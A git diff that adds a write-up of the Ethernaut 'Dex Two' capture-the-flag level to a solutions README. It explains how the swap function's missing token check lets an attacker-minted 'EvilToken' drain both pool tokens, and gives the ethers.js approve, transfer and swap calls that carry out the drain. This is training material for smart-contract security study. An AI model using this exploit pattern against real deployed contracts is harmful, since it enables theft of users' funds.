@@ -25,6 +25,7 @@
 20. [Denial](#20---denial)
 21. [Shop](#21---shop)
 22. [Dex](#22---dex)
+23. [Dex Two](#23---dex-two)
     
 ## 01 - Fallback
 
@@ -738,3 +739,59 @@ await tx.wait()
 ```
 
 [Test script](./test/Dex.test.js)
+
+
+## 23 - Dex Two
+
+We need to drain all of the tokens from the DexTwo contract.
+This level is similar to [Dex](#22---dex) level, with slight modification in the `swap` function.
+```solidity
+function swap(address from, address to, uint amount) public {
+   require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+   uint swapAmount = getSwapAmount(from, to, amount);
+   IERC20(from).transferFrom(msg.sender, address(this), amount);
+   IERC20(to).approve(address(this), swapAmount);
+   IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+}
+```
+The `swap` function doesn't check that `from` and `to` must be `token1` and `token2`. 
+The method `getSwapPrice` determines the exchange rate between tokens in the Dex:
+```solidity
+function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+   return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+}
+```
+So, for us to drain all the tokens from the DexTwo contract, we create an `EvilToken` contract with pre-minted tokens(400 is enough) and use it to swap both tokens.
+The `DexTwo` contract starts with `100` tokens of `token1`. We need to swap `x` amount of `EvilToken` to get all the `100` tokens of `token1`. Having this in mind, given the formula of the exchange rate, and after solving a simple math equation, we conclude that swapping `100` of `EvilToken` will result in draining all the `100` tokens of `token1`.<br>
+Following the same reasoning, we conclude that swapping `200` tokens of `EvilToken` will result in draining all the `100` tokens of `token2`. Here's the balance & price history:
+|        | Contract |           |        | Player |           |
+|--------|----------|-----------|--------|--------|------------
+| Token1 | Token2   | EvilToken | Token1 | Token2 | EvilToken |
+| 100    | 100      | 100       | 10     | 10     | 300       |
+| 0      | 100      | 200       | 110    | 10     | 200       |
+| 0      | 0        | 400       | 110    | 110    | 0         |
+
+We just need now to make transactions to the `DexTwo` contract. Using `ethers.js`:
+
+First, we need to call the `approve` function on both `DexTwo` & `EvilToken` to allow the contracts to transfer all of our tokens with enough allowance, so we don't have to approve again on each transaction:
+```javascript
+tx = await evilToken.approve(dexTwo.address, 300)
+await tx.wait()
+
+tx = await dexTwo.approve(dexTwo.address, 400)
+await tx.wait()
+```
+We need first to transfer `100` of `EvilToken` to the `DexTwo` contract to start, so we can solve the rate exchange equation later(avoiding having 2 unknowns in the equation).
+```javascript
+tx = await evilToken.transfer(dexTwo.address, 100);
+await tx.wait();
+```
+Swaps transactions:
+```javascript
+tx = await dexTwo.swap(evilToken.address, token1.address, 100);
+await tx.wait();
+
+tx = await dexTwo.swap(evilToken.address, token2.address, 200);
+await tx.wait();
+```
+[EvilToken Contract](./contracts/DexTwo.sol) | [Test script](./test/DexTwo.test.js)
